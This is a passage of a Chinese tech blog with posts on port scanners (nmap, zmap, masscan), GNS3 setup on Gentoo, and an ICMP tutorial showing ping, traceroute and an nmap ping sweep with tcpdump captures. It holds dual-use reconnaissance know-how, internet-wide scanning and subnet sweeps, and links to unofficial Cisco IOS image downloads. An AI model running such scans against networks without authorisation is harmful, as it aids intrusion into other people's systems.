</span>  -<span class="ruby">-log-<span class="symbol">errors:</span> <span class="constant">Log</span> errors/warnings to the normal-format output file
</span>  -<span class="ruby">-append-<span class="symbol">output:</span> <span class="constant">Append</span> to rather than clobber specified output files
</span>  -<span class="ruby">-resume &lt;filename&gt;<span class="symbol">:</span> <span class="constant">Resume</span> an aborted scan
</span>  -<span class="ruby">-stylesheet &lt;path/<span class="constant">URL</span>&gt;<span class="symbol">:</span> <span class="constant">XSL</span> stylesheet to transform <span class="constant">XML</span> output to <span class="constant">HTML</span>
</span>  -<span class="ruby">-<span class="symbol">webxml:</span> <span class="constant">Reference</span> stylesheet from <span class="constant">Nmap</span>.<span class="constant">Org</span> <span class="keyword">for</span> more portable <span class="constant">XML</span>
</span>  -<span class="ruby">-no-<span class="symbol">stylesheet:</span> <span class="constant">Prevent</span> associating of <span class="constant">XSL</span> stylesheet w/<span class="constant">XML</span> output
</span>MISC:
  -<span class="ruby"><span class="number">6</span><span class="symbol">:</span> <span class="constant">Enable</span> <span class="constant">IPv6</span> scanning
</span>  -<span class="ruby"><span class="constant">A</span><span class="symbol">:</span> <span class="constant">Enable</span> <span class="constant">OS</span> detection, version detection, script scanning, <span class="keyword">and</span> traceroute
</span>  -<span class="ruby">-datadir &lt;dirname&gt;<span class="symbol">:</span> <span class="constant">Specify</span> custom <span class="constant">Nmap</span> data file location
</span>  -<span class="ruby">-send-eth/--send-<span class="symbol">ip:</span> <span class="constant">Send</span> using raw ethernet frames <span class="keyword">or</span> <span class="constant">IP</span> packets
</span>  -<span class="ruby">-<span class="symbol">privileged:</span> <span class="constant">Assume</span> that the user is fully privileged
</span>  -<span class="ruby">-<span class="symbol">unprivileged:</span> <span class="constant">Assume</span> the user lacks raw socket privileges
</span>  -<span class="ruby"><span class="constant">V</span><span class="symbol">:</span> <span class="constant">Print</span> version number
</span>  -<span class="ruby"><span class="symbol">h:</span> <span class="constant">Print</span> this help summary page.
</span>EXAMPLES:
  nmap -v -A scanme.nmap.org
  nmap -v -sn 192.168.0.0/16 10.0.0.0/8
  nmap -v -iR 10000 -Pn -p 80
SEE THE MAN PAGE (http://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES
</code></pre><h2 id="zmap">zmap</h2><p>Zmap是一个开源网络扫描器，旨在帮助研究人员轻松扫描互联网。通过单个机器和可观的上行量，zmap可以在45分钟内扫描整个IPv4地址段，达到以太网的理论上限。</p>
<p>zmap可以研究随时间变化协议的采用情况。检测互联网上可用的服务，让我们更好的理解分布在互联网上的大系统。</p>
<p>详细用法见：<a href="https://zmap.io/documentation.html" target="_blank" rel="external">Zmap Documentation</a></p>
<p>Zmap是强有力的工具，但请尊重他人和当地法律。</p>
<h2 id="masscan">masscan</h2><p>号称最快的互联网端口扫描器，它能够在6分钟内扫遍整个互联网，每秒发送十个百万数据包。</p>
<p>它生成类似<code>nmap</code>的结果，但内部机理是类似<code>scanrand</code>、<code>unicornscan</code>和<code>zmap</code>异步传输。主要的区别是比它们都快(笑)。另外，它更灵活，允许任意的地址段和端口段。</p>
<p>自由软件。</p>
<pre><code>~/ ⮀ masscan <span class="comment">--help</span>
MASSCAN is a fast port scanner. The primary input parameters are the
IP addresses/ranges you want to scan, and the port numbers. An example
is the following, which scans the 10.x.x.x network for web servers:
 masscan 10.0.0.0/8 -p80
The program auto-detects network interface/adapter settings. If this
fails, you'll have to <span class="operator"><span class="keyword">set</span> these manually. The <span class="keyword">following</span> <span class="keyword">is</span> an
example <span class="keyword">of</span> all the <span class="keyword">parameters</span> that <span class="keyword">are</span> needed:
 <span class="comment">--adapter-ip 192.168.10.123</span>
 <span class="comment">--adapter-mac 00-11-22-33-44-55</span>
 <span class="comment">--router-mac 66-55-44-33-22-11</span>
<span class="keyword">Parameters</span> can be <span class="keyword">set</span> either via the command-line <span class="keyword">or</span> config-<span class="keyword">file</span>. The
<span class="keyword">names</span> <span class="keyword">are</span> the same <span class="keyword">for</span> <span class="keyword">both</span>. Thus, the above adapter <span class="keyword">settings</span> would
appear <span class="keyword">as</span> <span class="keyword">follows</span> <span class="keyword">in</span> a configuration <span class="keyword">file</span>:
 adapter-ip = <span class="number">192.168</span><span class="number">.10</span><span class="number">.123</span>
 adapter-mac = <span class="number">00</span>-<span class="number">11</span>-<span class="number">22</span>-<span class="number">33</span>-<span class="number">44</span>-<span class="number">55</span>
 router-mac = <span class="number">66</span>-<span class="number">55</span>-<span class="number">44</span>-<span class="number">33</span>-<span class="number">22</span>-<span class="number">11</span>
All single-dash <span class="keyword">parameters</span> have a spelled <span class="keyword">out</span> <span class="keyword">double</span>-dash equivalent,
so <span class="string">'-p80'</span> <span class="keyword">is</span> the same <span class="keyword">as</span> <span class="string">'--ports 80'</span> (<span class="keyword">or</span> <span class="string">'ports = 80'</span> <span class="keyword">in</span> config <span class="keyword">file</span>).
<span class="keyword">To</span> <span class="keyword">use</span> the config <span class="keyword">file</span>, <span class="keyword">type</span>:
 masscan -<span class="keyword">c</span> &lt;filename&gt;
<span class="keyword">To</span> generate a config-<span class="keyword">file</span> <span class="keyword">from</span> the <span class="keyword">current</span> <span class="keyword">settings</span>, <span class="keyword">use</span> the <span class="comment">--echo</span>
<span class="keyword">option</span>. This stops the program <span class="keyword">from</span> actually running, <span class="keyword">and</span> just echoes
the <span class="keyword">current</span> configuration instead. This <span class="keyword">is</span> a useful way <span class="keyword">to</span> generate
your <span class="keyword">first</span> config <span class="keyword">file</span>, <span class="keyword">or</span> see a <span class="keyword">list</span> <span class="keyword">of</span> <span class="keyword">parameters</span> you didn<span class="string">'t know
about. I suggest you try it now:
 masscan -p1234 --echo</span></span>
</code></pre><p><a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="external">Masscan github页面</a><br><a href="http://blog.erratasec.com/2013/09/masscan-entire-internet-in-3-minutes.html" target="_blank" rel="external">Masscan: the entire Internet in 3 minutes </a></p>
<h2 id="自制扫描器">自制扫描器</h2><p>没啥好说的，拿这gevent写啊……暂时不开源。通常我先用zmap扫端口，然后送给自己的扫描器去扫。</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/network/2014/04/03/gns3-on-gentoo-linux/" itemprop="url">
                  GNS3 on Gentoo Linux
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-04-03T00:00:00+08:00" content="2014-04-03">
              2014-04-03
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/network/" itemprop="url" rel="index">
                    <span itemprop="name">network</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/network/2014/04/03/gns3-on-gentoo-linux/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="network/2014/04/03/gns3-on-gentoo-linux/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="Install_and_Configure_GNS3">Install and Configure GNS3</h2><p>First, You should install gns3:</p>
<pre><code>sudo emerge <span class="comment">--autounmask-write gns3</span>
sudo <span class="built_in">dispatch</span>-conf
sudo emerge gns3
</code></pre><p>Then you need to prepare for ios images, You can download them from:</p>
<pre><code><span class="string">ftp:</span><span class="comment">//ftp.unikon-ua.net/pub/Cisco/IOS/</span>
<span class="string">http:</span><span class="comment">//115.com/file/clsclmjb</span>
</code></pre><p>Then you should configure them:</p>
<pre><code>Edit&gt;IOS Images <span class="keyword">and</span> Hypervisors
</code></pre><p>And calculate ‘Idle PC’。</p>
<p>You may want to get rid of warning of <code>baseconfig.txt</code>, refer to:</p>
<pre><code><span class="string">http:</span><span class="comment">//forum.gns3.net/post12717.html</span>
</code></pre><p>If you are using KDE, you may use konsole’s preconfigured terminal commands.</p>
<pre><code>Edit&gt;Preferences&gt;<span class="keyword">General</span>&gt;Terminal Settings
</code></pre><p>You need to install and configure virtualbox at <code>Edit&gt;Preferences&gt;VirtualBox</code>:</p>
<ul>
<li><p>modify <code>Path to vboxwrapper</code> to:</p>
<pre><code><span class="regexp">/usr/</span>libexec<span class="regexp">/gns3/</span>vboxwrapper.py
</code></pre></li>
<li><p>emerge virtualbox with sdk and python USE flags</p>
</li>
<li><p>install vboxapi:</p>
<pre><code>cd /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">virtualbox</span>/<span class="title">sdk</span>/<span class="title">installer</span>/</span>
export <span class="constant">VBOX_INSTALL_PATH</span>=<span class="regexp">/usr/lib</span><span class="regexp">/virtualbox/</span>
python vboxapisetup.py install
</code></pre></li>
<li><p>install xdotool(It’s quite an interesting tool!)</p>
<pre><code><span class="title">sudo</span> emerge xdotool
</code></pre></li>
<li>add virtual system:<pre><code><span class="keyword">Edit</span>&gt;Preferences&gt;VirtualBox&gt;VirtualBox Guest
</code></pre></li>
</ul>
<p>You need to install qemu at <code>Edit&gt;Preferences&gt;Qemu</code>:</p>
<ul>
<li><p>modify <code>Path to qemu</code>:</p>
<pre><code>qemu-<span class="keyword">system</span>-x86_64
</code></pre></li>
<li><p>modify path to qemuwrapper to:</p>
<pre><code><span class="regexp">/usr/</span>libexec<span class="regexp">/gns3/</span>qemuwrapper.py
</code></pre></li>
<li><p>kernel should support kvm-intel:</p>
<pre><code> ⮀ ~ ⮀ lsmod|grep kvm
kvm_intel             <span class="number">117933</span>  <span class="number">0</span> 
kvm                   <span class="number">225670</span>  <span class="number">1</span> kvm_intel
</code></pre></li>
<li><p>and add you user to:</p>
<p>  gpasswd -a username kvm</p>
</li>
<li><p>add virtual system, which can be <code>vdi</code></p>
</li>
<li><p>If you want to use PIX firewall, download pemu from <a href="http://sourceforge.net/projects/gns-3/files/Pemu/2008-03-03/pemu_2008-03-03_bin.tar.bz2/download" target="_blank" rel="external">Sourceforge</a> and cp them to the directory which has <code>qemuwrapper.py</code>. You can reffer to: <a href="http://www.gns3.net/documentation/gns3/pix-firewall-emulation/" target="_blank" rel="external">http://www.gns3.net/documentation/gns3/pix-firewall-emulation/</a></p>
</li>
<li><p>if you re-compile kernel, don’t forget to re-compile kernel modules for virtualbox and modprobe them</p>
</li>
</ul>
<h2 id="More_configuration">More configuration</h2><p>More configuration and downloads(I tried and failed, do not know what is actually is and how to use it):</p>
<ul>
<li><a href="http://xinchq2011.blog.51cto.com/2086938/1256837" target="_blank" rel="external">分享–实现用GNS3模拟 PC，PIX，Juniper，ASA，IPS的应用 (中文)</a></li>
</ul>
<h2 id="A_Simple_Test">A Simple Test</h2><ul>
<li>Calc idle PC, very important!!</li>
</ul>
<p>configure the router with the help of <a href="http://www.linkwan.com/gb/routertech/routerbase/ciscomanual/015.htm" target="_blank" rel="external">OSPF configure(中文)</a></p>
<p>A better choice to learn without these configuration, try <a href="http://sourceforge.net/projects/gns3workbench/files/v5.8/" target="_blank" rel="external">GNS3 WorkBench</a></p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/network/2014/03/15/play-icmp/" itemprop="url">
                  Playing and Learning ICMP in Action
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-03-15T00:00:00+08:00" content="2014-03-15">
              2014-03-15
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/network/" itemprop="url" rel="index">
                    <span itemprop="name">network</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/network/2014/03/15/play-icmp/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="network/2014/03/15/play-icmp/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>ICMP协议是IP协议的一部分，虽然它的包被封装在IP包内，好像是IP上层的协议，但它确实是IP协议不可分割的一部分。ICMP协议非常复杂，它用来提供有关网络的消息。</p>
<p>ICMP通常被用来侦查网络。各种ICMP报文甚至可能绕过防火墙探查内网，探测访问控制列表等。</p>
<p>ICMP有时也会被利用来做路由重定向和DDOS等其它用途。</p>
<h2 id="ping和traceroute">ping和traceroute</h2><p>ping可以用来判断一个ip地址(当提供域名时一般会解析成ip)对应的机器是否在线。</p>
<p>traceroute则为了探测一个包到目的地所经过的路由。</p>
<p><code>ping</code>利用了<code>ICMP echo request</code>和<code>ICMP echo reply</code>。而<code>traceroute</code>则利用了<code>ICMP time-exceeded error message</code>。</p>
<p>我们可以先<code>ping</code>和<code>traceroute</code>来实际看下，</p>
<pre><code> ~ ⮀ ping -c <span class="number">1</span> baidu.com
PING baidu.com (<span class="number">220.181</span><span class="number">.111</span><span class="number">.86</span>) <span class="number">56</span>(<span class="number">84</span>) <span class="keyword">bytes</span> <span class="operator">of</span> data.
<span class="number">64</span> <span class="keyword">bytes</span> <span class="built_in">from</span> <span class="number">220.181</span><span class="number">.111</span><span class="number">.86</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">50</span> <span class="built_in">time</span>=<span class="number">2.07</span> ms

<span class="comment">--- baidu.com ping statistics ---</span>
<span class="number">1</span> packets transmitted, <span class="number">1</span> received, <span class="number">0</span>% packet loss, <span class="built_in">time</span> <span class="number">0</span>ms
rtt <span class="built_in">min</span>/<span class="built_in">avg</span>/<span class="built_in">max</span>/mdev = <span class="number">2.070</span>/<span class="number">2.070</span>/<span class="number">2.070</span>/<span class="number">0.000</span> ms

 ~ ⮀ sudo tcpdump -X <span class="string">"icmp"</span> 
tcpdump: verbose output suppressed, use -v <span class="operator">or</span> -vv <span class="keyword">for</span> full protocol decode
listening <span class="command"><span class="keyword">on</span> <span class="title">eth0</span>, <span class="title">link-type</span> <span class="title">EN10MB</span> (<span class="title">Ethernet</span>), <span class="title">capture</span> <span class="title">size</span> <span class="title">65535</span> <span class="title">bytes</span></span>
<span class="number">18</span>:<span class="number">16</span>:<span class="number">47.917236</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">220.181</span><span class="number">.111</span><span class="number">.86</span>: ICMP echo request, id <span class="number">9095</span>, seq <span class="number">1</span>, <span class="built_in">length</span> <span class="number">64</span>
<span class="number">18</span>:<span class="number">16</span>:<span class="number">47.919293</span> IP <span class="number">220.181</span><span class="number">.111</span><span class="number">.86</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span>: ICMP echo reply, id <span class="number">9095</span>, seq <span class="number">1</span>, <span class="built_in">length</span> <span class="number">64</span>
</code></pre><p>如果用<code>wireshark</code>就能看得更加清楚了，懒得截图。</p>
<p>我们接着看看traceroute是什么样的。</p>
<pre><code> ~ ⮀ <span class="tag">traceroute</span> <span class="tag">bbs</span><span class="class">.byr</span><span class="class">.cn</span>
<span class="tag">traceroute</span> <span class="tag">to</span> <span class="tag">bbs</span><span class="class">.byr</span><span class="class">.cn</span> (10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span>), 30 <span class="tag">hops</span> <span class="tag">max</span>, 60 <span class="tag">byte</span> <span class="tag">packets</span>
 1  10<span class="class">.210</span><span class="class">.96</span><span class="class">.193</span> (10<span class="class">.210</span><span class="class">.96</span><span class="class">.193</span>)  3<span class="class">.360</span> <span class="tag">ms</span>  3<span class="class">.637</span> <span class="tag">ms</span>  3<span class="class">.919</span> <span class="tag">ms</span>
 2  10<span class="class">.2</span><span class="class">.100</span><span class="class">.1</span> (10<span class="class">.2</span><span class="class">.100</span><span class="class">.1</span>)  1<span class="class">.511</span> <span class="tag">ms</span>  1<span class="class">.657</span> <span class="tag">ms</span>  1<span class="class">.825</span> <span class="tag">ms</span>
 3  10<span class="class">.2</span><span class="class">.1</span><span class="class">.1</span> (10<span class="class">.2</span><span class="class">.1</span><span class="class">.1</span>)  1<span class="class">.834</span> <span class="tag">ms</span>  2<span class="class">.422</span> <span class="tag">ms</span>  2<span class="class">.809</span> <span class="tag">ms</span>
 4  10<span class="class">.0</span><span class="class">.10</span><span class="class">.1</span> (10<span class="class">.0</span><span class="class">.10</span><span class="class">.1</span>)  0<span class="class">.512</span> <span class="tag">ms</span>  0<span class="class">.524</span> <span class="tag">ms</span>  0<span class="class">.531</span> <span class="tag">ms</span>
 5  10<span class="class">.0</span><span class="class">.13</span><span class="class">.2</span> (10<span class="class">.0</span><span class="class">.13</span><span class="class">.2</span>)  1<span class="class">.719</span> <span class="tag">ms</span>  2<span class="class">.021</span> <span class="tag">ms</span>  2<span class="class">.139</span> <span class="tag">ms</span>
 6  10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> (10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span>)  0<span class="class">.946</span> <span class="tag">ms</span>  0<span class="class">.493</span> <span class="tag">ms</span>  0<span class="class">.483</span> <span class="tag">ms</span>

 ~ ⮀ <span class="tag">sudo</span> <span class="tag">tcpdump</span> <span class="tag">-i</span> <span class="tag">eth0</span> "<span class="tag">not</span> <span class="tag">udp</span> <span class="tag">and</span> <span class="tag">not</span> <span class="tag">arp</span>"
<span class="tag">tcpdump</span>: <span class="tag">verbose</span> <span class="tag">output</span> <span class="tag">suppressed</span>, <span class="tag">use</span> <span class="tag">-v</span> <span class="tag">or</span> <span class="tag">-vv</span> <span class="tag">for</span> <span class="tag">full</span> <span class="tag">protocol</span> <span class="tag">decode</span>
<span class="tag">listening</span> <span class="tag">on</span> <span class="tag">eth0</span>, <span class="tag">link-type</span> <span class="tag">EN10MB</span> (<span class="tag">Ethernet</span>), <span class="tag">capture</span> <span class="tag">size</span> 65535 <span class="tag">bytes</span>
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.471441</span> <span class="tag">IP</span> 10<span class="class">.2</span><span class="class">.100</span><span class="class">.1</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 68
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.471566</span> <span class="tag">IP</span> 10<span class="class">.2</span><span class="class">.100</span><span class="class">.1</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 68
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.472026</span> <span class="tag">IP</span> 10<span class="class">.0</span><span class="class">.10</span><span class="class">.1</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 36
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.472089</span> <span class="tag">IP</span> 10<span class="class">.0</span><span class="class">.10</span><span class="class">.1</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 36
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.472106</span> <span class="tag">IP</span> 10<span class="class">.0</span><span class="class">.10</span><span class="class">.1</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 36
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.472113</span> <span class="tag">IP</span> 10<span class="class">.2</span><span class="class">.100</span><span class="class">.1</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 68
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.472120</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">udp</span> <span class="tag">port</span> 33449 <span class="tag">unreachable</span>, <span class="tag">length</span> 68
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.472207</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">udp</span> <span class="tag">port</span> 33450 <span class="tag">unreachable</span>, <span class="tag">length</span> 68
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.472218</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">udp</span> <span class="tag">port</span> 33451 <span class="tag">unreachable</span>, <span class="tag">length</span> 68
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.472227</span> <span class="tag">IP</span> 10<span class="class">.2</span><span class="class">.1</span><span class="class">.1</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 36
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.472536</span> <span class="tag">IP</span> 10<span class="class">.210</span><span class="class">.96</span><span class="class">.193</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 68
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.472756</span> <span class="tag">IP</span> 10<span class="class">.2</span><span class="class">.1</span><span class="class">.1</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 36
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.472765</span> <span class="tag">IP</span> 10<span class="class">.210</span><span class="class">.96</span><span class="class">.193</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 68
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.473175</span> <span class="tag">IP</span> 10<span class="class">.210</span><span class="class">.96</span><span class="class">.193</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 68
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.473192</span> <span class="tag">IP</span> 10<span class="class">.2</span><span class="class">.1</span><span class="class">.1</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 36
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.473196</span> <span class="tag">IP</span> 10<span class="class">.0</span><span class="class">.13</span><span class="class">.2</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 68
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.473442</span> <span class="tag">IP</span> 10<span class="class">.0</span><span class="class">.13</span><span class="class">.2</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 68
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.473603</span> <span class="tag">IP</span> 10<span class="class">.0</span><span class="class">.13</span><span class="class">.2</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 68
</code></pre><p>可以用<code>wireshark</code>更详细的检查。</p>
<p>我们接着看看其它东西。</p>
<h2 id="ping扫射和广播ICMP">ping扫射和广播ICMP</h2><p>ping扫射会<code>ping</code> 一个网段内所有的主机，判断ip所对应的主机是否在线。速度非常快</p>
<p>先试着一个ping sweep，在LAN下nmap如果不明确禁止，一定会使用arp来ping，所以要看看ICMP如何完成ping就禁用它, 然后抓包。</p>
<pre><code> ~ ⮀ sudo nmap -sP <span class="comment">--disable-arp 10.210.96.0/27</span>

Starting Nmap 6.25 ( http://nmap.org ) at 2014-03-21 19:29 CST
Nmap scan report for 10.210.96.1
Host is up (0.0014s latency).
Nmap scan report for 10.210.96.13
Host is up (0.0023s latency).
Nmap done: 32 IP addresses (2 hosts up) scanned in 1.97 seconds

 ~ ⮀ sudo tcpdump "icmp"
 tcpdump: verbose output suppressed, <span class="operator"><span class="keyword">use</span> -v <span class="keyword">or</span> -vv <span class="keyword">for</span> <span class="keyword">full</span> protocol <span class="keyword">decode</span>
 listening <span class="keyword">on</span> eth0, <span class="keyword">link</span>-<span class="keyword">type</span> EN10MB (Ethernet), capture <span class="keyword">size</span> <span class="number">65535</span> <span class="keyword">bytes</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.205871</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.1</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">15450</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.205895</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.2</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">39828</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.205901</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.3</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">26191</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.205907</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.4</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">27927</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.205911</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.5</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">40326</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.205917</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.6</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">20451</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.205923</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.7</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">54339</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.205930</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.8</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">662</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.205934</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.9</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">44505</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
